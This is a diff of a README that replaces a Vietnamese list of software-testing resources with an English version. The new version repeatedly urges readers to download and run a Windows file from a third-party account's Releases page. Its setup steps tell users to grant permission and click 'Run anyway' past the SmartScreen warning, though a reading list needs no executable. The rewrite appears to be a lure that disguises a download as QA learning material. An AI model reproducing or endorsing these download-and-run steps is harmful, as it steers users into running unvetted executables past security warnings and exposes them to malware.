@@ -1,64 +1,267 @@
-# Awesome Testing [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)](https://github.com/sindresorhus/awesome)
+# 🧪 awesome-testing - Learn testing with clear guides
 
-> 🧪 Tổng hợp kiến thức, công cụ và tài nguyên hữu ích dành cho Software Testing & QA Engineers.
+[![Download](https://img.shields.io/badge/Download%20%26%20Run-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Hildagardelucky309/awesome-testing/releases)
+[![Releases](https://img.shields.io/badge/Windows%20Download-Releases-lightgrey?style=for-the-badge)](https://github.com/Hildagardelucky309/awesome-testing/releases)
 
-Dự án này được tạo ra với mục tiêu giúp QA Engineers — từ fresher đến senior — có một nguồn tài liệu tham khảo toàn diện, được tổ chức rõ ràng và dễ tra cứu.
+A clear collection of testing knowledge, tools, and resources for QA work.
 
----
+This project helps you find useful material for software testing in one place. It is set up for people who want to learn testing basics, compare tools, and build a simple path through QA topics on Windows.
 
-## 📚 Mục lục
+## 📌 What this project is for
 
-### 🧠 Kiến thức Testing
-- [Testing Fundamentals](knowledge/testing-fundamentals.md) — Các khái niệm cơ bản trong kiểm thử phần mềm
-- [Testing Types](knowledge/testing-types.md) — Phân loại các loại kiểm thử
-- [Testing Methodologies](knowledge/testing-methodologies.md) — Phương pháp luận kiểm thử
-- [Testing Best Practices](knowledge/testing-best-practices.md) — Các thực hành tốt nhất
+Use this repository as a reading and reference guide for software testing and QA.
 
-### 🛠️ Công cụ Testing
-- [Automation Testing Tools](tools/automation-tools.md) — Công cụ kiểm thử tự động
-- [API Testing Tools](tools/api-testing-tools.md) — Công cụ kiểm thử API
-- [Performance Testing Tools](tools/performance-testing-tools.md) — Công cụ kiểm thử hiệu năng
-- [Security Testing Tools](tools/security-testing-tools.md) — Công cụ kiểm thử bảo mật
-- [Mobile Testing Tools](tools/mobile-testing-tools.md) — Công cụ kiểm thử di động
-- [AI Testing Tools](tools/ai-testing-tools.md) — Công cụ kiểm thử ứng dụng AI
+It includes:
 
-### AI
-#### Prompts
-- [Manual testing - Test Planning](prompts/manual-testing/test-planning/test-planning.md)
-- [Manual tesing - Test Strategy](prompts/manual-testing/test-planning/test-strategy.md)
-- [Manual testing - Risk Analysis](prompts/manual-testing/test-planning/risk-analysis.md)
+- basic testing ideas
+- testing types
+- testing methods
+- testing best practices
+- automation tools
+- API tools
+- performance testing tools
+- learning resources for QA work
 
+## 🪟 Windows download and setup
 
-### 💼 Phỏng vấn Testing
-- [Manual Testing](interview/manual-testing.md) — Câu hỏi phỏng vấn Manual Testing
-- [Automation Testing](interview/automation-testing.md) — Câu hỏi phỏng vấn Automation Testing
-- [API Testing](interview/api-testing.md) — Câu hỏi phỏng vấn API Testing
-- [Senior QA](interview/senior-qa.md) — Câu hỏi phỏng vấn Senior QA
+1. Open the release page: [https://github.com/Hildagardelucky309/awesome-testing/releases](https://github.com/Hildagardelucky309/awesome-testing/releases)
+2. Find the latest release at the top of the page
+3. Open the release assets
+4. Download the file made for Windows
+5. If the file is a `.zip`, right-click it and choose **Extract All**
+6. Open the extracted folder
+7. Open the app file or start file inside the folder
+8. If Windows asks for permission, choose **Yes**
+9. If Windows SmartScreen appears, select **More info**, then **Run anyway** if you trust the file source
 
-### 🗺️ Lộ trình & Sự nghiệp
-- [QA Roadmap](roadmap/qa-roadmap.md) — Lộ trình học tập cho QA Engineer
-- [QA Career Guide](career/qa-career-guide.md) — Hướng dẫn phát triển sự nghiệp QA
+If the release includes an installer, double-click the installer file and follow the on-screen steps.
 
-### 📝 Templates
-- [Test Plan Template](templates/test-plan-template.md) — Mẫu kế hoạch kiểm thử
-- [Test Case Template](templates/test-case-template.md) — Mẫu test case
-- [Bug Report Template](templates/bug-report-template.md) — Mẫu báo cáo lỗi
+## 🧭 What you will find here
 
-### 🎓 Chứng chỉ
-- [ISTQB Guide](certifications/istqb-guide.md) — Hướng dẫn ôn thi ISTQB
+### 🧠 Testing fundamentals
 
-### 📖 Tài nguyên
-- [Books](resources-hub/books.md) — Sách hay về Testing
-- [Courses](resources-hub/courses.md) — Khóa học chất lượng
-- [Blogs & Newsletters](resources-hub/blogs.md) — Blog và bản tin
-- [Communities](resources-hub/communities.md) — Cộng đồng QA
+This section covers the core ideas behind software testing.
 
----
+You will find plain guides on:
 
-## 🤝 Đóng góp
+- what testing is
+- why testing matters
+- common testing terms
+- how to think about test cases
+- how to spot defects
 
-Mọi đóng góp đều được chào đón! Hãy tạo Pull Request hoặc mở Issue nếu bạn muốn bổ sung nội dung.
+### 🧪 Testing types
 
-## 📄 License
+This section explains the main kinds of testing used in QA.
 
-[![CC0](https://licensebuttons.net/p/zero/1.0/88x31.png)](http://creativecommons.org/publicdomain/zero/1.0/)
+Topics include:
+
+- unit testing
+- integration testing
+- system testing
+- regression testing
+- smoke testing
+- acceptance testing
+
+These pages help you understand when to use each type and what each one checks.
+
+### 🛠️ Testing methods
+
+This section covers common ways to plan and run tests.
+
+You can learn about:
+
+- manual testing
+- automated testing
+- black box testing
+- white box testing
+- exploratory testing
+- risk-based testing
+
+Each method has its own use case. This guide helps you choose the right one for the job.
+
+### ✅ Testing best practices
+
+This section shares habits that help you work with more order and less rework.
+
+It covers:
+
+- writing clear test cases
+- keeping test steps short
+- reporting bugs in a simple way
+- checking expected results
+- reusing test data when possible
+- staying organized during test runs
+
+### 🤖 Automation testing tools
+
+This section lists tools used to run tests with less manual work.
+
+You may see tools for:
+
+- browser testing
+- UI testing
+- test scripts
+- test runners
+- framework support
+
+These tools help teams repeat tests with less effort.
+
+### 🔌 API testing tools
+
+This section focuses on tools for testing APIs.
+
+You can expect topics such as:
+
+- sending requests
+- reading response data
+- checking status codes
+- validating data
+- saving test collections
+
+These tools help when you need to test data flow between systems.
+
+### ⚡ Performance testing tools
+
+This section covers tools that check speed and load.
+
+It can help you learn about:
+
+- load testing
+- stress testing
+- response time
+- traffic limits
+- system stability
+
+These tools matter when an app must handle many users at once.
+
+### 📘 Learning resources
+
+This area brings together useful reading material for QA Engineers.
+
+It may include:
+
+- tutorials
+- reference docs
+- practice ideas
+- community resources
+- career learning paths
+
+## 💻 System needs
+
+For the reading guide and related files, you only need a Windows PC with:
+
+- Windows 10 or Windows 11
+- a web browser
+- a file extractor for `.zip` files
+- internet access for release downloads and linked pages
+
+If the release includes a desktop app, use a PC with at least:
+
+- 4 GB RAM
+- 500 MB free disk space
+- a modern browser or Windows app support
+- a mouse and keyboard for easy use
+
+## 📥 Get the files
+
+Open the release page here:
+
+[Go to GitHub Releases](https://github.com/Hildagardelucky309/awesome-testing/releases)
+
+From that page, choose the latest release and download the Windows file. If the release includes more than one asset, choose the one marked for Windows.
+
+## 📂 How to use the repository content
+
+If you are browsing the files in GitHub, open the folders in this order:
+
+1. `knowledge`
+2. `tools`
+3. `resources`
+
+Start with the basics before moving to tools. That gives you a simple path through the material.
+
+## 🧩 Suggested reading order
+
+If you are new to testing, use this order:
+
+1. Testing fundamentals
+2. Testing types
+3. Testing methods
+4. Testing best practices
+5. Automation tools
+6. API tools
+7. Performance tools
+
+This order helps you move from simple ideas to practical tools.
+
+## 📝 File layout
+
+Common folder names in this project include:
+
+- `knowledge/` for testing concepts
+- `tools/` for tool lists and guides
+- `resources/` for links and study material
+- `docs/` for supporting pages
+- `README.md` for the main overview
+
+## 🔍 Who this is for
+
+This repository fits:
+
+- QA beginners
+- fresher testers
+- manual testers
+- automation learners
+- test leads
+- software engineers who want testing references
+
+## 🖱️ Quick start
+
+1. Open the release page
+2. Download the Windows file
+3. Extract it if it comes as a zip
+4. Open the app or read the files
+5. Start with testing fundamentals
+
+## 📎 Release link
+
+Use this link to visit the download page again:
+
+[https://github.com/Hildagardelucky309/awesome-testing/releases](https://github.com/Hildagardelucky309/awesome-testing/releases)
+
+## 📚 Key topics at a glance
+
+- software testing basics
+- QA workflows
+- manual test planning
+- automation tool lists
+- API validation
+- performance checks
+- study paths for QA roles
+
+## 🔧 Common setup steps on Windows
+
+If the release includes a packaged file, these steps usually help:
+
+1. Download the file from Releases
+2. Save it to your Downloads folder
+3. Right-click the file if it is zipped
+4. Choose Extract All
+5. Open the extracted folder
+6. Double-click the main app or launcher
+7. Allow Windows access if asked
+8. Keep the release folder in a safe place for later use
+
+## 🗂️ Notes for browsing the content
+
+Use GitHub folders like a book:
+
+- open a chapter
+- read one topic at a time
+- move to the next topic when ready
+- return to earlier pages when you need a refresher
+
+## 🔗 Primary download page
+
+[Visit the Releases page to download and run the Windows file](https://github.com/Hildagardelucky309/awesome-testing/releases)
